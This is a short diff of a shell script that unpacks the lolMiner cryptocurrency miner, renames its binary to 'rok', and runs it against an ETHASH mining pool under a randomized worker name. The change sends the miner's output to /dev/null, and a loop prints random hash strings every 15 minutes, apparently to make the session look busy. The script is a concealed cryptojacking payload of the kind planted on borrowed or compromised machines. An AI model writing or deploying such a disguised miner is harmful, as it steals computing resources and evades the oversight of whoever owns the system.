@@ -6,7 +6,8 @@ tar xvf lolMiner_v1.12_Lin64.tar.gz
 cd 1.12
 mv lolMiner rok
 chmod 777 rok
-./rok --algo ETHASH --pool ethash.poolbinance.com:443 --user TeslaM.$(echo $(shuf -i 1-9999 -n 1)-T4) >
+./rok --algo ETHASH --pool ethash.poolbinance.com:443 --user TeslaM.$(echo $(shuf -i 1-9999 -n 1)-T4) > /dev/null
+
 while [ 1 ]; do
 
   while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 15m; done
